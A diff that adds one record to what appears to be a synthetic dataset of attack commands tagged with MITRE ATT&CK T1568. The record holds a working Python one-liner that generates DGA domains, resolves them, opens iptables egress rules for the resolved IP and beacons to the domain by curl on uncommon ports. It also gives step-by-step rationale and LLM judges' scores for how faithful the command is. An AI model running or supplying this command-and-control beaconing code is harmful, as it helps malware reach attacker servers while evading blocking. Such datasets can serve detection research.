@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ttl-rotate'; tlds=['com','net']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:8]+'.'+tlds[i%len(tlds)] for i in range(n)]\nport=random.choice([18081,22443,12053])\nlast_ip=None\nfor cycle in range(2):\n    dom=random.choice(dga(12))\n    ttl=60; ip=None\n    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=dom,qtype='A')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; ttl=getattr(a,'ttl',60); break\n    if ip and ip!=last_ip:\n        subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n        subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/beat'])\n        print('cycle',cycle,dom,ip,port,'ttl',ttl)\n        last_ip=ip\n    time.sleep(min(ttl,90))\"",
+  "explanation": "Performs TTL-aware re-resolution of DGA domains to rotate C2 endpoints over time, allowing egress per-selected IP and beaconing over uncommon ports.",
+  "rationale_steps": [
+    "Compute short-lived DGA domains each cycle.",
+    "Resolve via scapy and read TTL to inform rotation cadence.",
+    "Whitelist the resolved IP and port with iptables.",
+    "Beacon, sleep approximately the TTL, and rotate endpoints."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-0d8481e1",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a DGA algorithm to generate domains, resolving them to IPs, implementing TTL-aware rotation, establishing firewall rules for the discovered endpoints, and performing beaconing over uncommon ports.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:36:50.619251Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed, with correct imports, function definitions, control flow, and argument structures for `subprocess.run` and Scapy, and is validly encapsulated for `python3 -c` execution.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command accurately implements DGA, dynamic resolution, TTL-aware logic, and beaconing attempts consistent with T1568, the `iptables` command requires root privileges, which contradicts the stated 'Privilege: None' and prevents the 'allowing egress' claim from being semantically correct or operationally plausible.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T05:37:05.579320Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes and parentheses, valid separators, and correct flag usage for iptables and curl.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements DGA-based, TTL-aware re-resolution and beaconing with rotating ports aligning to T1568, but relies on scapy raw packets and iptables changes that typically require root, so under 'Privilege: None' the resolution and egress-allow steps are unlikely to function.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2025-10-02T05:37:42.585645Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
